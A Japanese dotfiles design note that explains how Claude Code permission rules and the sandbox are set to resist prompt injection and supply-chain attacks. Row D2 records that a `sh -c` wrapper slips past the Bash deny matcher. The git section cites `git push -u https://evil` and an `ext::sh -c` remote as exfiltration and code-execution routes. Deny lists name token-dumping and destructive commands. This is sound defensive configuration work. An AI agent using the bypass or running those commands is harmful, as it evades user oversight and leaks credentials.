# Claude Code のセキュリティ設定

> **仕様の一次情報は公式 Docs**（[permissions](https://code.claude.com/docs/en/permissions) / [sandboxing](https://code.claude.com/docs/en/sandboxing)）。仕様はバージョンで変わりドリフトするため、permissions / sandbox を変更する前に必ず公式 Docs を参照する（`.claude/rules/claude-code-settings.md` で常設指示）。本書は **dotfiles 固有の判断**と、**公式から自明でない検証済み挙動（delta、検証日つき）**だけを書く。仕様の写経はしない。

脅威モデル: プロンプトインジェクション（実行主体は Claude の Bash / Write / Edit tool）と Shai-Hulud 型サプライチェーン攻撃。設定の実体は `dotfiles/.claude/settings.json`。

## 設計の前提（公式仕様のうち、判断の土台になる点だけ）

詳細は公式 Docs に譲り、ここでは**うちの判断が依存する核**だけを明記する（出典: permissions / sandboxing）:

- **Sandbox（OS 強制）は Bash subprocess とその子だけ**に効く。**Permission rule は全 tool**（Read/Edit/Write/Bash/WebFetch…）に効く。別レイヤ。
- **built-in deny は無い**。sandbox の default は全 read 可（`~/.aws/credentials`・`~/.ssh/` すら読める）。塞ぐパスは自分で `denyRead` / Permission `Read` deny に列挙する。
- **Permission の `Read`/`Edit` deny は sandbox 境界にマージ**され subprocess にも効く。逆に **sandbox の `denyRead`/`denyWrite` は Claude の Read/Edit/Write tool には効かない**（tool は permission を直接使う）。
- **「Edit rules apply to all built-in tools that edit files」**（Docs 原文）。→ 組み込み **Write tool も Edit カテゴリ**。Claude tool の write を縛るのは **`Edit(...)`**（`Write(...)` は組み込み Write tool に無効。実機挙動は `D3`）。
- sandbox の **write は allowlist**（cwd `.`・`$TMPDIR`・`~/.gnupg`・`~/.npm`（cache/logs）等のみ可）、**read は denylist**（全許可からの除外）。
- Permission パス書式の要注意点: **`/path` は絶対でなくプロジェクトルート相対**（絶対は `//path`、home は `~/path`）。取り違えると home 配下を全く守れない。書式詳細は公式 Docs。

### 帰結（うちの運用判断）

- パスを subprocess と Claude tool の両方から守るには **Permission `Read`/`Edit` deny** を書けば足りる（sandbox にマージされる）。**write 防御は必ず `Edit(...)`**（`Write(...)` は組み込み Write tool に無効＝`D3`）。
- **2 つの deny リストを丸ごと同期する必要はない**。read は Permission deny が自動マージ（`sandbox.denyRead` への複製は冗長）、write は sandbox allowlist が home を元から塞ぐ（home 系 `sandbox.denyWrite` は冗長で、実効を持つのは allow 内の例外＝`~/.gnupg/*`・cwd 内のみ）。
- **冗長な sandbox 列挙は意図的に残す**: 「sandbox config 単体で何が遮断されるか」が明示され、Permission 層を取り違えても安全側に倒れるため。

## 検証済み delta（インデックス）

公式 Docs に明記が無い／読み落としやすい実機挙動。**仕様変更でドリフトしうる**ため、各行に**最終確認日と Claude Code バージョン**を記録する（その行を最後に真と確認した時点＝鮮度。「いつまで真だったか」の履歴ではない）。本文からは ID（`D1` 等）で参照する。permission を触るときは公式 Docs と実機で**再確認し、挙動が変わっていたらその行を上書き更新（日付・バージョン・内容）、不要になったら削除**する。**表は常に現状のみを映す**（経緯は git 履歴が持つので、古い記述を残して肥大化させない）。

| ID | 検証日 | CC ver | 挙動（要約） |
|----|--------|--------|-------------|
| `D1` | 2026-05-23 | 未記録 | Read/Edit deny が Permission 層でカバーする Bash コマンドは `cat`/`head`/`tail`/`sed` 等の**認識コマンドのみ**で、`xxd`/`od`/`wc`/`less`/`bat`/`more`/`strings` は漏れる。ただし **sandbox 内では Read deny が sandbox にマージされ全 read が OS 遮断されるので顕在化しない**。漏れるのは **unsandbox / `excludedCommands` 経路**で、対策は必要時に明示 Bash viewer deny（現状は未配備）。`sed` は read-only 用途でも Edit 扱い。`allowRead` 内のパスは Read deny の Bash カバーが外れる |
| `D2` | 2026-05-25 | 2.1.150 | Bash matcher はシェルオペレータ（`&&` `;` `\|` 等）と `$(...)` を分解して各部に適用するが、**別パス名（`/bin/echo` 等）・インタプリタ包み（`sh -c` / `bash -c` / `python -c`）は取りこぼす**。`sh -c '<denied>'` 一発で deny を回避できる → Bash deny は「うっかり承認を防ぐ床」であって境界ではない（境界は sandbox） |
| `D3` | 2026-05-25 | 2.1.150 | **`Write(...)` deny は組み込み Write tool をブロックしない**。Write tool（作成/上書き）は Edit カテゴリで `Edit(...)` のみが縛る。`Write(...)` の実効は Bash redirect 遮断のみ。パス形式（`~/dir/**`/exact/`**/X`）で差は無く `Edit` の有無が全て。live-reload は file tool でも正常。実証: `Write(~/.kube/**)` のみ→作成が通り `Edit(~/.kube/**)` 追加→ブロック |
| `D4` | 2026-05-25 | 2.1.150 | **`Read(//**/*.pem)`（秘密鍵保護）が公開 CA バンドル（`cert.pem`）まで巻き込み**、sandbox 内で CA を read 遮断する。結果、sandbox 内の `git push`/`curl` 等が CA をロードできず **TLS 確立前に失敗**（`error setting certificate verify locations`）。commit はローカルのみで無傷。対策は「sandbox 内で TLS を通す」節（CA バンドルを `allowRead` 例外＋env で参照）。問題は **Claude Code sandbox 固有**（通常ターミナルでは `Read(...)` deny が効かないので無関係） |
| `D5` | 2026-06-08 | 2.1.168 | **`.git/config`（完全一致）と `.git/hooks/` は harness 組み込みで sandbox-write-deny**（settings.json 由来でない。worktree 非依存で main repo でも `git config --local` 書き込みが `Operation not permitted`）。`objects`/`refs`/`logs`/`index`/`.git` 直下・`config.xxx` は許可なので **`git commit` は通るが `git push -u`/`--set-upstream`/`push.autoSetupRemote` は落ちる非対称**（tracking を `.git/config` に書くため）。しかも config 書き込み拒否でも **git は exit 0 ＋「branch '...' set up to track」でサイレント失敗** → upstream 永続化されず次の素 `git push` が「no upstream configured」。理由は `.git/config` の `core.sshCommand`/`fsmonitor`/alias/`hooksPath` が RCE 源（`~/.gitconfig` deny と同系統）。対策は §git の `excludedCommands` 行き。**Claude の Edit tool は `.git/config` を書ける**（seatbelt 外・`Edit(.git/config)` deny も無し）＝in-sandbox の `git branch -D` が残す orphan config section の手当てに使える。D4 の TLS 失敗（push が落ちる別原因）とは無関係 |

## ファイル別の保護方針

新しい機密パスを足すときは、まず**保護クラス**を決め、レシピを**丸ごと**適用する。層ごとに場当たりで一部だけ書くとドリフトして片方の層に穴が残る（過去の 1Password write 無防備・認証 dir の Claude-tool write 開放がこれ）。**write 防御は必ず `Edit(...)` を書く**（`Write(...)` は組み込み Write tool に無効＝`D3`）。

| クラス | 例 | レシピ |
|--------|-----|--------|
| **A. 全遮断ディレクトリ**（read も write も不可） | `~/.ssh` `~/.aws` `~/.config/gh` `~/.config/op` `~/.config/1Password` `~/.kube` `~/.gnupg/private-keys-v1.d` | Permission `Read(~/dir/**)` + `Edit(~/dir/**)`（read 自動マージで subprocess も。write は Edit で新規作成も止まる）。＋明示性で sandbox `denyRead`/`denyWrite`・`Write(~/dir/**)` も列挙 |
| **B. 公開 dotfile**（read 可・write 不可） | `~/.gitconfig` `~/.npmrc`（home） | Permission `Edit(~/file)`。Read deny は**書かない**。＋ sandbox `denyWrite`・`Write(~/file)` 列挙 |
| **C. 解放だが改ざん防止**（read 可・write 不可） | shell rc（`~/.bashrc` `~/.zshrc` `~/.config/fish`）、gpg conf | exact-file または `~/dir/**` で Permission `Edit`。＋ sandbox `denyWrite`（allow 内例外はここが実効）・`Write(...)` 列挙 |
| **D. FS 全体対称 deny**（`//**`） | 秘密鍵 `*.pem` `*.key` `id_rsa` 等 | Permission `Read(//**/X)` + `Edit(//**/X)` + `Write(//**/X)`（read は sandbox マージで subprocess も遮断。unsandbox は `D1` の viewer 漏れが残る） |
| **E. プロジェクト内 secret**（read 可・write 不可） | `.env` `.env.*` `secrets/**` `*secret*` `*credential*` | Permission `Edit(**/X)`（組み込み Write tool）＋ `Write(**/X)`（Bash redirect）。両方書く |

| パス | Read | Write | 区分 |
|------|------|-------|------|
| `~/.gitconfig` | 解放 | sandbox `denyWrite` + Permission `Edit`/`Write` deny | 公開 dotfile |
| `~/.npmrc` | 解放 | sandbox `denyWrite` + Permission `Edit`/`Write` deny | 公開 dotfile |
| `.env` 等（プロジェクト内 secret） | 解放 | Permission `Edit(**/X)`（Write tool）＋ `Write(**/X)`（Bash redirect） deny | read 解放・write 防止 |
| 秘密鍵 `*.pem` `*.key` `id_rsa` `id_ed25519` `id_ecdsa` `id_dsa` | Permission `Read(//**/...)` で FS 全体遮断 | Permission `Edit`/`Write(//**/...)` で FS 全体遮断（改ざん・偽鍵設置防止） | 明示 deny（read/write とも対称） |
| `~/.ssh` `~/.aws` `~/.config/gh` `~/.config/op` `~/.config/1Password` `~/.kube` `~/.gnupg/private-keys-v1.d` | sandbox `denyRead` + Permission `Read(~/dir/**)` deny | sandbox `denyWrite` + Permission `Edit(~/dir/**)` deny（`Write(~/dir/**)` も併記、実効は Edit） | ディレクトリ全遮断（read/write とも subprocess + Claude tool） |
| `~/.docker` | dir 全体: sandbox `denyRead`／config.json: Permission `Read` deny | dir 全体: sandbox `denyWrite`／config.json: Permission `Edit`/`Write` deny | 認証実体 config.json を全経路遮断（他ファイルは Claude tool から読める） |
| `~/.netrc` | sandbox `denyRead` + Permission `Read` deny | sandbox `denyWrite` + Permission `Edit`/`Write` deny | 認証情報遮断 |
| `~/.bashrc` `~/.zshrc` `~/.config/fish` | 解放 | sandbox `denyWrite` + Permission `Edit`/`Write` deny | rc 改ざん（ログイン時コード実行）防止 |
| `~/.gnupg`（conf 以外） | 解放（agent 通信・署名検証に必要） | sandbox `allowWrite` で許可。ただし `gpg-agent.conf`/`gpg.conf`/`dirmngr.conf` は sandbox `denyWrite` + Permission `Edit`/`Write` deny | 署名運用・設定改ざん防止 |

### 公開 dotfile（`~/.gitconfig` / `~/.npmrc`）

read を解放し、write のみ防御する。

- read 解放の理由: `~/.npmrc` は `min-release-age` 等のサプライチェーン防御や registry/proxy 設定を npm/pnpm subprocess に効かせるため（`denyRead` で塞ぐと機能しない）。`~/.gitconfig` は dotfiles で公開管理する設定で秘匿価値がない。
- write が即時攻撃面: `~/.npmrc` は `registry=` で install 先すり替え・`ignore-scripts=false`・`cafile=` で TLS バイパス・`min-release-age` 削除で防御無効化。`~/.gitconfig` は alias 注入や `core.sshCommand` で通常 git 操作時に任意コード実行。
- 規律: **read 解放したファイルに平文 secret を置かない**。認証トークンは平文でなく環境変数参照（例: `~/.npmrc` の `_authToken=${FLATT_NPM_TOKEN}`）で書き、実体は実行時に消費プロセスの env にのみ注入する（fnox 経由。[docs/fnox-token-management.md](./fnox-token-management.md)）。read 解放経路に技術的フォールバックは無く、平文 secret を置けば即漏洩しうる。

### 秘密鍵・シークレット系

- 秘密鍵は `*.pem` `*.key` `id_rsa` `id_ed25519` `id_ecdsa` `id_dsa` の各パターンを **`Read`/`Edit`/`Write` とも `//**/...`（FS 全体）で対称に遮断**（read=exfil 防止、edit/write=改ざん・偽鍵設置防止。sandbox マージで subprocess も OS レベル遮断）。`Read(//**/*.key)`/`Read(//**/*.pem)` は秘密鍵以外の `.key`（i18n キー等）や**公開 CA バンドル（`cert.pem`）**も巻き込む。CA バンドルを巻き込むと sandbox 内 TLS が壊れる（`D4`）→「sandbox 内で TLS を通す」で read だけ個別解放（write は FS 全体ルールのまま遮断）。
- `.env`（プロジェクト内）は開発上の正当な read 用途があるため read 解放。書き換えは **`Edit` と `Write` の両方**で防止: `.env`/`.env.*`/`secrets/**`/`*secret*`/`*credential*`、project ローカル認証ファイルは `**/.npmrc`/`**/.netrc`。`Edit(**/X)` が Claude の組み込み Write/Edit tool を、`Write(**/X)` が subprocess の Bash redirect を塞ぐ（二経路。`D3`）。

## Bash コマンドの実行制御（auto-allow / git / gh）

`autoAllowBashIfSandboxed: true`（詳細は公式 sandboxing）:

- sandbox 内コマンドは **auto-allow**（`ask`/prompt 不到達）。`deny` は実行前評価で全経路に効く。`rm`/`rmdir` が `/`・home 直撃時のみ circuit breaker で prompt。
- → 純粋系コマンド（`dirname`/`basename`/`realpath`/`date` 等）の `allow` 列挙は冗長。`allow` が効くのは sandbox 外実行（`excludedCommands`）の `gh *`・`git push -u origin *` 系と、Bash 外の `WebFetch` だけ。

### git

**in-sandbox の git には permission ルールを置かない**（auto-allow なので冗長）。read-only git は built-in 認識で allow 不要。write・破壊系は sandbox 内完結で auto-allow（`github.com` は `allowedDomains` 内なので push/fetch も）。`ask` は不到達なので無意味。破壊系は sandbox 境界＋`allowedDomains`（github 限定＝外部流出にならない）を信頼して容認。確実に止めたい操作は `deny` か PreToolUse hook。

**例外: upstream 設定の push は `excludedCommands` 行き＝§gh と同じ扱い**。`git push -u origin *` / `git push --set-upstream origin *` は sandbox 外実行にする。理由は upstream tracking（`branch.X.remote`/`merge`）の書き込み先 `.git/config` が sandbox-write-deny で、in-sandbox だと **exit 0 のサイレント失敗で upstream が永続化されない**ため（`D5`）。sandbox 外＝permission flow に乗るので、§gh の write 系と同様に **allow が必要**（無いと default mode で `ask` に落ち毎回プロンプト。in-sandbox の auto-allow は効かない）。

- **リモートは `origin` にピン留め必須**: `remote.origin.url` 自体が `.git/config` write 保護下で改竄不能なので origin は信頼できる固定先。`git push -u *`（wildcard リモート）は `git push -u https://evil` や `ext::sh -c '<cmd>'` を通し**任意ホスト流出/ローカル RCE** を開くため禁止。allow も `Bash(git push -u origin *)` / `Bash(git push --set-upstream origin *)` と origin 固定で書く。
- upstream 設定後の素 `git push` は config 書き込み不要なので sandbox 内で OK（除外不要）。`excludedCommands` 変更は seatbelt プロファイルがセッション開始時に焼かれるため**セッション再起動で反映**。

### gh

gh は Go 製で **macOS Seatbelt 下で TLS 検証に失敗**する（`gcloud`/`terraform` も同様）。`sandbox.excludedCommands: ["gh *"]` で全 gh を sandbox 外実行させ、**permission flow に乗せる**（git と違い `allow`/`ask`/`deny` が厳密に効く）。

- **allow**: read 系（`gh pr view`/`list`/`diff`/`checks`、`gh issue view`/`list`、`gh repo view`、`gh run view`/`list`、`gh release view`/`list`、`gh search`、`gh label list`、`gh auth status`）＋ SKILL 用 write（`gh pr create`/`edit`/`comment`）。
- **ask**: `gh api *`（GET と書き込みを matcher で区別できないため一律）/ `gh workflow run *` / `gh run rerun *`。
- **deny**: `gh auth token`（トークン実値出力）/ `gh secret *` / `gh repo delete *` / `gh gist create *`（外部送信経路）/ `gh ssh-key *` / `gh gpg-key *`。
- `gh auth status` は完全一致 allow（トークンはマスク表示。ワイルドカードでないため `gh auth token` deny に波及しない）。
- `excludedCommands` は引数含めマッチさせるため**ワイルドカード必須**。`"gh pr create"`（完全一致形）は実呼び出し `gh pr create --title ...` に当たらず不発（sandbox 内実行のまま TLS 失敗）。`"gh *"` で全サブコマンドをカバー。

### fnox

fnox（秘匿情報の live fetch。詳細は [docs/fnox-token-management.md](./fnox-token-management.md)）は内部で op CLI を spawn し、op は Go 製で gh と同じく **Seatbelt 下で TLS 検証に失敗**する。`sandbox.excludedCommands: ["fnox *"]` で sandbox 外実行させて解決する。

- **`fnox *` を除外する（`op *` ではない）**: Claude が直接叩くのは `fnox`、op はその子プロセス。`excludedCommands` は **Claude の Bash tool が submit するコマンド文字列の先頭**にマッチするため、`op *` は `fnox exec ...` に当たらず不発。親 `fnox` を除外すれば子 op も sandbox 外に出る（実機検証で確定）。
- **deny**: `fnox get *`（secret 値を stdout に出力）/ `fnox export *`（一括出力）。`gh auth token` deny と同じ思想で Claude が値を直接吐けないようにする。`fnox exec`（値を出力せず子プロセスに env 注入するだけ）は **allow 維持**＝これがシェル関数ラッパー（全シェル一様。`npm` 等の関数が `fnox exec -- npm` に展開）の実行経路。
- 余波と運用: ラッパー関数経由の素の `npm install` 等は Claude が submit する文字列が `npm ...`（関数展開後に `fnox exec` を spawn）で `fnox *` に当たらず sandbox 内に残り、子 op が TLS 失敗で token 未解決＝401。**token を要する registry 操作は AI も含め `fnox exec -- <pm> …` の形で明示的に打つ**＝`fnox *` に当たり sandbox 外で解決される（その install のみ unsandbox。`npm */yarn *` の全除外より狭く、token 不要の install は sandbox 内に留めて postinstall のサプライチェーン防御を維持）。AI 向け呼び出し規則は `.claude/rules/fnox-sandbox-invocation.md`。
- 切り分け（実機確認・誤対処の回避）: 原因は **Go/Seatbelt の TLS 検証**であって egress ではない。`my.1password.com` への egress 自体は sandbox 内でも到達する（curl で 405 が返り TLS も通過）ため、`allowedDomains` への追加は効かない。`SSL_CERT_FILE` も op には効かない（Go は `RootCAs=nil` で `trustd` 経由のプラットフォーム検証器を使い、Seatbelt がそれを遮断する。curl=LibreSSL のファイル CA とは経路が違う）。

### 破壊系コマンドの deny（床であって境界ではない）

`sudo`/`su`/`rm -rf /`・`~`/`dd`/`defaults` 等の deny は **blocklist で原理的に airtight にできない**（matcher は別パス・`sh -c` 包みを取りこぼす＝`D2`）。実効を持つのは **sandbox ON か人間が `ask` を捌くとき**だけで、**unsandboxed × bypassPermissions × 注入入力**では床が抜ける。よって deny は「うっかり承認を防ぐ床」と位置づけ、変種網羅は狙わない（境界は sandbox）。

- **`chmod 777 *` は不採用**: sandbox 下で allowWrite 外への chmod は遮断され、床としても `chmod -R 777`・`chmod 0777` を取りこぼす。「効く気がするが穴だらけ」で偽の安心を与えるため。
- **`dd *` は維持**: 正規利用がなく誤爆コスト ≒ 0。sandbox を切った日に効く床。
- **`defaults write`/`delete`/`import` は採用**: `defaults` は cfprefsd デーモン（sandbox 外プロセス）経由で macOS 設定を変えるため、sandbox の filesystem 制限を貫通しうる数少ない「本物の」防御。設定削除・一括上書きも塞ぐ。

## bun のサプライチェーン対策

bun は `.npmrc` の `min-release-age` を読まない（[oven-sh/bun#22679](https://github.com/oven-sh/bun/issues/22679)）。`~/.bunfig.toml` の `[install] minimumReleaseAge` で別途設定する。単位は秒（`604800` = 7 日）。pnpm/npm の `min-release-age` は日単位。

### ccstatusline

statusLine / hooks で使う `ccstatusline` は `bunx -y @latest` を避け、`bun add -g ccstatusline@<固定版>` でグローバル導入し、コマンドを `ccstatusline --hook`（PATH 経由）にする。`@latest` の毎起動 fetch（UserPromptSubmit / PreToolUse / statusLine）はサプライチェーン攻撃経路になる。更新は `bun update -g ccstatusline`（`minimumReleaseAge` が効く）。PATH に `~/.bun/bin` が通っている前提。

## Sandbox 追加設定

### `enableWeakerNetworkIsolation: false`

macOS Sandbox 内のシステム TLS 信頼サービス（`com.apple.trustd.agent`）へのアクセスを許可するフラグ。`true` はセキュリティを低下させる。

- `true` が必要: `httpProxyPort` を MITM プロキシ + カスタム CA と併用し Go ベース CLI に TLS 検証させる環境。
- 本リポジトリ: MITM プロキシを使わないため `false`。gh の TLS 失敗は `excludedCommands: ["gh *"]`（sandbox 外実行）で回避する（「gh」参照）。

### npm install を sandbox 内で通す

sandbox は network を allowlist、write を cwd 中心の allowlist で絞るため、`npm install` には2点の明示許可が要る（実機で発覚）:

- **registry への egress**: `sandbox.network.allowedDomains` に取得先を列挙する。本リポジトリの既定 registry は **`npm.flatt.tech`** ＝ Takumi Guard（旧 Shisho Guard, by GMO）の**公開 read-only セキュリティプロキシ registry**で、npmjs を代理しブロックリスト該当の悪性 package を**コード到達前に 403 で拒否**する（shai-hulud 等サプライチェーン防御の一層）。token は任意だが **rate limit が変わる**（匿名＝2,000 req/min/IP・ブロックのみ／個人 `tg_anon_`＝10,000 req/min/token＋download 追跡・breach 通知／`tg_org_`＝10,000 req/10s/token・有料 org。超過は 429、〜2 req/package）。dotfiles は**マシングローバルに個人 `tg_anon_` token**を使い（rate 緩和＋追跡）ORG/`tg_org_` は不使用（出典 <https://shisho.dev/docs/ja/t/guard/>、rate: <https://shisho.dev/docs/ja/t/guard/limitation>）。pnpm/yarn（及び **npm 本体の mise install**＝既定が `aqua:npm/cli`・npmjs.org tarball）は非 FLATT backend（aqua/github 等）で公開 `registry.npmjs.org` に直接当たるため、**両ドメインとも** allowedDomains に要る（プロジェクト依存の `npm install` 自体は従来どおり FLATT 経由）。無いと registry に到達できず install が失敗する。`~/.npmrc` の registry 設定自体は read 解放で効くが、**ネットワーク到達は allowedDomains が別ゲート**なので両方そろえる。
- **キャッシュ書き込み**: `sandbox.filesystem.allowWrite` に `~/.npm/_cacache`（npm の content-addressable cache）を追加する。sandbox は cwd 外への write を塞ぐため、無いと install がキャッシュ書き込みで失敗する。`~/.npm/_logs` は Claude Code デフォルトで許可済みだが `_cacache` は別途必要。他の `~/.npm` 配下書き込みで失敗するなら `~/.npm` に広げる。
- broad な `allowedDomains` は exfiltration 経路になりうる（公式 sandboxing の警告）。registry は必要最小限に絞る。

### sandbox 内で TLS を通す（CA バンドル）

`Read(//**/*.pem)`（秘密鍵保護）が sandbox にマージされ、**公開 CA バンドル（`cert.pem`）まで read 遮断**してしまう（`D4`）。このため sandbox 内の `git push`/`curl`/openssl 系ツールが CA をロードできず TLS で失敗する。秘密鍵の `*.pem` 遮断は維持したまま、**公開 CA バンドルだけ例外解放**して解消する:

- **`sandbox.filesystem.allowRead` に CA バンドルを追加**: `/opt/homebrew/etc/ca-certificates/cert.pem`（arm64 Homebrew の実バンドル）。`allowRead` は denyRead 領域内の再許可なので、`*.pem` 遮断を保ったままこの1ファイルだけ subprocess に**読ませる**。中身は公開ルート CA 証明書のみ（秘密鍵 0 件）なので read 解放は安全。**write/改ざん（偽 CA 追記→MITM）は別軸の脅威**で、これは `Edit`/`Write(//**/*.pem)`（FS 全体ルール）で引き続き遮断される。read だけ解放、write は塞ぐ、の非対称が成立。
- **ツールを読めるパスに向ける env**: git のデフォルト CA（`/etc/ssl/cert.pem`）も `*.pem` 遮断＋`/private/etc` 制限で読めないので、`settings.json` の `env` で CA を明示する。`GIT_SSL_CAINFO`（git。`SSL_CERT_FILE` 単体では git は不可と実機確認）＋ `SSL_CERT_FILE`/`CURL_CA_BUNDLE`（openssl/curl 系）を同バンドルに向ける。
- **置き場は Claude Code の `settings.json`**（mise 等のグローバル env ではない）。この問題は **Claude Code sandbox 固有**（通常ターミナルでは `Read(...)` deny が効かず git は普通に通る）なので、修正も Claude スコープに閉じる。`settings.json` の `env` は sandbox サブプロセスに継承される。
- 補足: commit はローカル操作（`.git` 書き込み＋gpg socket 署名）で TLS 不要のため、この問題でも成功する。push だけが TLS を要して落ちる、という非対称になる。

### GnuPG 署名コミット

署名コミット（`commit.gpgsign=true`、OpenPGP 鍵）は sandbox 外常駐の gpg-agent と Unix socket で通信して署名する（いずれも実機検証で確定）:

- **`allowUnixSockets: ["~/.gnupg/S.gpg-agent"]` は必須**。外すと agent 接続不可で署名できない（`can't connect to the agent`）。socket パスは `gpgconf --list-dirs agent-socket` と一致させる。
- 署名「作成」はクライアント側の `~/.gnupg` 書き込み不要（agent が担う）。一方「検証」（`git verify-commit` / `git log --show-signature`）は trustdb ロックで `~/.gnupg` 書き込みを要求するため、検証を sandbox 内で通すなら `allowWrite: ~/.gnupg` を維持。
- **ハードニング**: `gpg-agent.conf`/`gpg.conf`/`dirmngr.conf` の改ざん（特に `pinentry-program` 書き換えによるパスフレーズ窃取）を塞ぐ。**2 経路必要**: sandbox `denyWrite`（subprocess）＋ Permission **`Edit` deny**（組み込み Write/Edit tool。`Write` 併記するが実効は Edit＝`D3`）。秘密鍵 `private-keys-v1.d` も `Edit` deny を併記。
- **注意**: socket を塞ぐと gpg-agent が停止し sandbox 内から再起動できない（fork が Seatbelt で制限）。復活は sandbox 外で `gpgconf --launch gpg-agent`。

## 設定変更時の検証

permission は挙動が直感に反するため、**推測せず公式 Docs ＋実機で検証する**（`.claude/rules/claude-code-settings.md`）。

- ダミーファイルを `$TMPDIR/<test>/` または cwd（`./<test>/`）に作り、Bash と Read/Edit tool で deny されるか確認する（どちらも sandbox 書込可）。
- 設定は live reload で同セッション内に反映される（Bash deny・sandbox filesystem・Read/Edit/Write tool deny いずれも実機確認）。**tool の write 防御は必ず `Edit(...)` deny で試す**。`Write(...)` は組み込み Write tool に効かないため、`Write` だけで試すと「効かない」と誤認する（`D3`）。
- built-in deny の有無を確認する時は、sandbox `denyRead` と Permission `Read(...)` deny の**両方**を外してから確認する（Permission deny が sandbox にマージされ `denyOnly` に出るため、片方だけ外すと出自を誤認する）。
- 一時編集した settings.json は完全復元する。Bash の `cp` 復元は sandbox 自己保護（`denyWithinAllow` に settings.json 実体）で拒否されるため、Edit/Write tool で戻す。
- 破壊的副作用に注意: socket（`allowUnixSockets`）を外す検証は gpg-agent を停止させ sandbox 内から復活できない。検証後は sandbox 外で `gpgconf --launch gpg-agent`。

## 関連

- 公式 Docs（仕様の一次情報・毎回参照）: [permissions](https://code.claude.com/docs/en/permissions) / [sandboxing](https://code.claude.com/docs/en/sandboxing)
- `.claude/rules/claude-code-settings.md`: 設定変更時の鉄則（公式 Docs 参照・実機検証）
- `## AI tools`（README.md）: MCP / plugins / Agent Skills の管理方針
- `dotfiles/.claude/settings.json`: 設定の実体
- `dotfiles/.bunfig.toml`: bun の supply-chain 設定
